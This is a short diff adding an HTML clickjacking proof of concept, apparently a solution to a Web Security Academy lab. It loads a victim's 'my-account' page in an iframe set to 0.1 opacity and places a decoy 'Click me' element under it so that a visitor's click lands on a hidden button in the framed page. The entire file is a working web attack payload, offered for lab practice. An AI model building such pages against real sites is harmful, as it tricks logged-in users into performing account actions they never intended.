@@ -1,0 +1,18 @@
+<style>
+   iframe {
+       position:relative;
+       width: 500px;
+       height: 700px;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   div {
+       position:absolute;
+       top:470px;
+       left:60px;
+       z-index: 1;
+   }
+</style>
+<div>Click me</div>
+<iframe src="https://0a3500ad03a7d4c0809cb7d70034008b.web-security-academy.net/my-account"></iframe>
+
